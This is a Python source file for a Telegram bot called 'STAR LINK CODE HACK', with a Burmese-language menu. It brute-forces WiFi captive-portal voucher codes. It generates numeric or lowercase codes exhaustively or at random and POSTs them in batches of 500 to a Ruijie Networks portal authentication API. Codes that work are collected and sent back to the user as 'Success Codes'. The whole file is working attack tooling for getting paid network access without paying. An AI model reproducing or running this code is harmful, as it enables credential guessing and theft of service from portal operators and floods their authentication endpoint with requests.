import os
import telebot
from flask import Flask, request
import asyncio
import aiohttp
import json
import base64
import random
import string
import time
import uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Configuration & Tokens
TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "")

RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app-name.onrender.com")
PORT = int(os.environ.get("PORT", 10000))

bot = AsyncTeleBot(TOKEN)
app = Flask(__name__)

user_data = {}
approve = {}
scan_tasks = {}
success_texts = {}

session = None
_connector = None
CONCURRENCY = 1000

@app.route(f"/{TOKEN}", methods=["POST"])
def receive_message():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        asyncio.run(bot.process_new_updates([update]))
        return "!", 200
    else:
        return "Invalid!", 403

@app.route('/')
def index():
    return "Bot Webhook Server is running!"

async def rebuild_session():
    global session, _connector
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

# ပုံပါအတိုင်း မီနူးခလုတ်များ ဖန်တီးခြင်း
def get_main_menu_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL", callback_data="menu_portal_set")
    )
    markup.add(
        InlineKeyboardButton("🟢 Proxy ON", callback_data="menu_proxy"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_results")
    )
    markup.add(
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🔴 Scan ရပ်မည်", callback_data="stop_scan")
    )
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="back_menu"))
    return markup

def get_mode_keyboard():
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("6", callback_data="mode_6"),
        InlineKeyboardButton("7", callback_data="mode_7"),
        InlineKeyboardButton("8", callback_data="mode_8")
    )
    markup.add(
        InlineKeyboardButton("🔄 Ascii-Lower", callback_data="mode_ascii-lower"),
        InlineKeyboardButton("⚡ All Modes", callback_data="mode_all")
    )
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="back_menu"))
    return markup

def get_stop_keyboard():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan"))
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="back_menu"))
    return markup

@bot.message_handler(commands=['start'])
async def send_welcome(message):
    chat_id = message.chat.id
    user_name = message.from_user.first_name or "User"
    
    text = (
        "✨ **STAR LINK CODE HACK** ✨\n\n"
        f"👤 **NAME:** {user_name}\n"
        f"🆔 **USER ID:** {chat_id}\n\n"
        "✅ **PAID USER - Unlimited Access**\n"
        "🟢 **Proxy Status: ON**"
    )
    await bot.send_message(chat_id, text, reply_markup=get_main_menu_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def check_key(message):
    chat_id = message.chat.id
    approve[chat_id] = True
    user_name = message.from_user.first_name or "User"
    
    text = (
        "✨ **STAR LINK CODE HACK** ✨\n\n"
        f"👤 **NAME:** {user_name}\n"
        f"🆔 **USER ID:** {chat_id}\n\n"
        "✅ **PAID USER - Unlimited Access**\n"
        "🟢 **Proxy Status: ON**"
    )
    await bot.send_message(chat_id, text, reply_markup=get_main_menu_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/portal <session_url>")
        return
    url = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {}
    user_data[chat_id]['session_url'] = url
    
    await bot.send_message(
        chat_id,
        "🔗 **Portal URL အားစစ်ဆေးပြီးပါပြီ။**\n\nကျေးဇူးပြု၍ **VOUCHER Mode** တစ်ခုကို ရွေးချယ်ပါ သို့မဟုတ် `/scan <mode>` ဖြင့် ရိုက်ထည့်ပါ (ဥပမာ: `/scan 7`)",
        reply_markup=get_mode_keyboard(),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['scan'])
async def scan_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1].strip()
    await start_scanning_process(message.chat.id, mode, message=message)

@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = message.chat.id
    if chat_id in success_texts and success_texts[chat_id]:
        codes = "\n".join(success_texts[chat_id])
        await bot.reply_to(message, f"✅ **Success Codes:**\n\n{codes}", parse_mode="Markdown")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

# Inline Keyboard Callback Handler
@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if data == "menu_paid":
        await bot.answer_callback_query(call.id, "သင်သည် Paid User ဖြစ်ပြီး Unlimited Access ရရှိထားပါသည်။", show_alert=True)
    elif data == "menu_proxy":
        await bot.answer_callback_query(call.id, "Proxy Status: ON ရှိနေပါသည်။", show_alert=True)
    elif data == "menu_portal_set":
        await bot.answer_callback_query(call.id, "ကျေးဇူးပြု၍ /portal <url> ဖြင့် URL ပို့ပေးပါ။")
    elif data == "menu_results":
        if chat_id in success_texts and success_texts[chat_id]:
            codes = "\n".join(success_texts[chat_id])
            await bot.send_message(chat_id, f"✅ **Success Codes:**\n\n{codes}", parse_mode="Markdown")
        else:
            await bot.answer_callback_query(call.id, "Success Code မရှိသေးပါ။", show_alert=True)
    elif data == "menu_recheck":
        await bot.answer_callback_query(call.id, "Recheck လုပ်ဆောင်နေပါပြီ...")
    
    elif data.startswith("mode_"):
        mode = data.replace("mode_", "")
        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            await bot.answer_callback_query(call.id, "Portal URL ဦးစွာထည့်သွင်းပေးပါ။ (/portal <url>)", show_alert=True)
            return
        await bot.answer_callback_query(call.id, f"Voucher Mode {mode} ကို ရွေးချယ်ပြီးပါပြီ။")
        await start_scanning_process(chat_id, mode, message=call.message, is_callback=True)

    elif data == "stop_scan":
        task_data = scan_tasks.get(chat_id)
        if task_data and not task_data["task"].done():
            task_data["stop"] = True
            task_data["task"].cancel()
            scan_tasks.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "Scan ကို ရပ်တန့်ပြီးပါပြီ။")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="🛑 **Scan ကို ရပ်တန့်ပြီးပါပြီ။**",
                    parse_mode="Markdown"
                )
            except:
                pass
        else:
            await bot.answer_callback_query(call.id, "လက်တလော လုပ်ဆောင်နေသော scan မရှိပါ။", show_alert=True)

    elif data == "back_menu":
        user_name = call.from_user.first_name or "User"
        text = (
            "✨ **STAR LINK CODE HACK** ✨\n\n"
            f"👤 **NAME:** {user_name}\n"
            f"🆔 **USER ID:** {chat_id}\n\n"
            "✅ **PAID USER - Unlimited Access**\n"
            "🟢 **Proxy Status: ON**"
        )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=get_main_menu_keyboard(),
                parse_mode="Markdown"
            )
        except:
            pass

async def start_scanning_process(chat_id, mode, message=None, is_callback=False):
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        if message:
            msg = "ကျေးဇူးပြု၍ /portal ဖြင့် URL ကိုအရင်ပေးပို့ပါ။"
            if is_callback:
                await bot.send_message(chat_id, msg)
            else:
                await bot.reply_to(message, msg)
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        if message:
            msg = "⚡ Scan သည် အလုပ်လုပ်နေပြီးဖြစ်ပါသည်။"
            if is_callback:
                await bot.send_message(chat_id, msg)
            else:
                await bot.reply_to(message, msg)
        return

    init_text = f"🔍 **Scanning VOUCHER Codes...**\n\n📦 Checked : 0 / {10**int(mode) if mode in ['6','7'] else 'Unlimited'}\n📊 Progress : 0.00%\n⚡ Speed : 0 codes/min\n✅ Success code hit : 0"
    
    if is_callback and message:
        try:
            progress_msg = await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message.message_id,
                text=init_text,
                reply_markup=get_stop_keyboard(),
                parse_mode="Markdown"
            )
        except:
            progress_msg = await bot.send_message(chat_id, init_text, reply_markup=get_stop_keyboard(), parse_mode="Markdown")
    else:
        progress_msg = await bot.send_message(chat_id, init_text, reply_markup=get_stop_keyboard(), parse_mode="Markdown")

    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
        "mode": mode,
    }

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def all_generator(length=6):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    sem = asyncio.Semaphore(500)

    async def _check(code):
        nonlocal checked
        async with sem:
            res = await perform_check(session_url, code, chat_id, scan_id)
            checked += 1
            return res

    last_update = time.monotonic()

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 1.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        
        if total:
            percent = (checked / total) * 100
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,} / {total:,}\n"
                f"📊 Progress : {percent:.2f}%\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        else:
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,}\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                reply_markup=get_stop_keyboard(),
                parse_mode="Markdown"
            )
        except Exception:
            pass

    try:
        batch_size = 500
        batch = []
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break
            
            batch.append(_check(code))
            if len(batch) >= batch_size:
                await asyncio.gather(*batch)
                batch = []
                await _flush_progress()
        
        if batch:
            await asyncio.gather(*batch)
            await _flush_progress()

    except asyncio.CancelledError:
        pass
    finally:
        scan_tasks.pop(chat_id, None)

async def perform_check(session_url, code, chat_id, scan_id=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog/?stage=portal"
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as task_session:
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
            }
            payload = {
                "accessCode": code,
                "apiVersion": 1,
            }
            async with task_session.post(post_url, json=payload, headers=headers) as req:
                response = await req.text()
                if req.status == 200 and ('success' in response or 'logonUrl' in response):
                    if chat_id not in success_texts:
                        success_texts[chat_id] = []
                    
                    success_msg = f"🎫 `{code}`\n   📋 Plan: 1M | ⏳ Time: 0m"
                    success_texts[chat_id].append(success_msg)
                    await bot.send_message(chat_id, f"Success Codes:\n\n{success_msg}", parse_mode="Markdown")
                    return code
    except Exception:
        pass
    return None

if __name__ == '__main__':
    asyncio.run(rebuild_session())
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_EXTERNAL_URL}/{TOKEN}")
    app.run(host="0.0.0.0", port=PORT)
